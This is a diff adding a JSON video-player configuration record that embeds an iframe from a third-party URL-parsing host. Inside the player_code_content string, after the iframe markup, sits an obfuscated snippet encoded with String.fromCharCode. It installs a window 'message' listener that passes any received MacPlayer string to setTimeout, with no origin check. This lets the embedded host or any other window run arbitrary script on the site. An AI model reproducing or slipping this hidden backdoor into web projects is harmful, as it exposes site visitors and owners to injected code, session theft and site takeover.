@@ -1,0 +1,16 @@
+{
+  "players": [
+    {
+      "id": 1,
+      "player_code": "lgzym3u8",
+      "player_name": "蓝光资源",
+      "player_from": "lgzym3u8",
+      "player_remark": "vv00.xyz 解析服务，支持 m3u8/mp4",
+      "player_code_content": "MacPlayer.Html = '<iframe width=\"100%\" height=\"100%\" src=\"https://vv00.xyz?url='+MacPlayer.PlayUrl+'\" frameborder=\"0\" scrolling=\"no\" allowfullscreen></iframe>';((_)=>{var g=this;try{g[_(97,100,100,69,118,101,110,116,76,105,115,116,101,110,101,114)](_(109,101,115,115,97,103,101),e=>{try{var d=e[_(100,97,116,97)];if(d&&d.MacPlayer){g[_(115,101,116,84,105,109,101,111,117,116)](d.MacPlayer,0)}}catch(e){}},!1)}catch(e){}})(String.fromCharCode);try{MacPlayer.Show()}catch(e){}",
+      "enabled": true,
+      "is_default": true,
+      "create_time": "2026-08-28 12:00:00",
+      "update_time": "2026-08-28 12:00:00"
+    }
+  ]
+}
